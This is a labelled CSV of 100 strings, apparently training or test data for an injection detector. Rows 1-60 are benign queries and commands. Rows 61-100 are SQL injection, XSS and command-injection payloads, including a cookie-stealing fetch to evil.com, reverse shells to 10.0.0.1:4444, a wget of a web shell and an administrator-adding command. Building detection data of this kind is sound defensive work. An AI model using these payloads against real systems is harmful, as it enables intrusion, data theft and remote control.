id,payload,label
1,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
2,"<div class='user-profile'>Welcome back, {username}!</div>",benign
3,docker run nginx,benign
4,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
5,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
6,git clone https://github.com/user/repo.git,benign
7,npm install express,benign
8,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
9,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
10,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
11,curl -I https://api.example.com/status,benign
12,SELECT price FROM items WHERE id = 209,benign
13,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
14,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
15,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
16,npm install express,benign
17,docker run nginx,benign
18,npm install express,benign
19,docker run nginx,benign
20,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
21,curl -I https://api.example.com/status,benign
22,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
23,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
24,"<div class='user-profile'>Welcome back, {username}!</div>",benign
25,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
26,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
27,curl -I https://api.example.com/status,benign
28,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
29,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
30,docker run nginx,benign
31,npm install express,benign
32,npm install express,benign
33,git clone https://github.com/user/repo.git,benign
34,"<div class='user-profile'>Welcome back, {username}!</div>",benign
35,docker run nginx,benign
36,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
37,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
38,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
39,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
40,SELECT price FROM items WHERE id = 209,benign
41,docker run nginx,benign
42,git clone https://github.com/user/repo.git,benign
43,curl -I https://api.example.com/status,benign
44,npm install express,benign
45,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
46,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
47,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
48,git clone https://github.com/user/repo.git,benign
49,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
50,curl -I https://api.example.com/status,benign
51,SELECT price FROM items WHERE id = 209,benign
52,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
53,"<div class='user-profile'>Welcome back, {username}!</div>",benign
54,curl -I https://api.example.com/status,benign
55,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
56,SELECT price FROM items WHERE id = 209,benign
57,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
58,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
59,npm install express,benign
60,git clone https://github.com/user/repo.git,benign
61,' OR 1=1 ORDER BY 1--,sql_injection
62,'; exec xp_cmdshell('net user'); --,sql_injection
63,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
64,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
65,admin' --,sql_injection
66,'; exec xp_cmdshell('net user'); --,sql_injection
67,'; WAITFOR DELAY '0:0:10'--,sql_injection
68,' OR '1'='1,sql_injection
69,')) OR 1=1--,sql_injection
70,' OR 1=1 ORDER BY 1--,sql_injection
71,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
72,'; WAITFOR DELAY '0:0:10'--,sql_injection
73,' OR 1=1 ORDER BY 1--,sql_injection
74,admin' --,sql_injection
75,' OR 1=1 ORDER BY 1--,sql_injection
76,javascript:alert(document.domain),xss
77,<svg onload=alert(1)>,xss
78,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
79,javascript:alert(document.domain),xss
80,<input onfocus=write(1) autofocus>,xss
81,<svg onload=alert(1)>,xss
82,<input onfocus=write(1) autofocus>,xss
83,javascript:alert(document.domain),xss
84,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
85,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
86,<iframe src='javascript:alert(`xss`)'></iframe>,xss
87,<img src=x onerror=alert('XSS')>,xss
88,<img src=x onerror=alert('XSS')>,xss
89,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
90,<input onfocus=write(1) autofocus>,xss
91,| cat /etc/passwd,cmd_injection
92,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
93,; wget http://malicious.com/shell.php,cmd_injection
94,|| echo 'evil' > script.sh,cmd_injection
95,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
96,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
97,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
98,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
99,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
100,& net user administrator /add,cmd_injection
